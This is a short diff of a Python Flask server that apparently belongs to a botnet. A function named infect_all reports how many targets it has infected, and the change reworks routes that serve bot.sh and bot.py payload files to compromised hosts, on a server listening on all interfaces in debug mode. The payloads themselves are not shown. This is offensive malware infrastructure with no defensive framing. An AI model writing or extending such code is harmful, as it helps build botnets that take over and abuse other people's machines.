@@ -34,10 +34,13 @@ def infect_all():
         time.sleep(1)
     return f"Infected: {len(targets)} targets\n"
     
-@app.route("/bot.sh")
-def send_bot():
-    print("Sending the bot", flush = True)
-    return send_file("bot.sh", mimetype="text/plain")
+@app.route("/bot-sh")
+def send_sh():
+    return send_file("bot.sh", mimetype="text/x-sh")
+
+@app.route("/bot-py")
+def send_py():
+    return send_file("bot.py", mimetype="text/x-python")
 
 app.run(host="0.0.0.0", port=5001,debug = True)
 
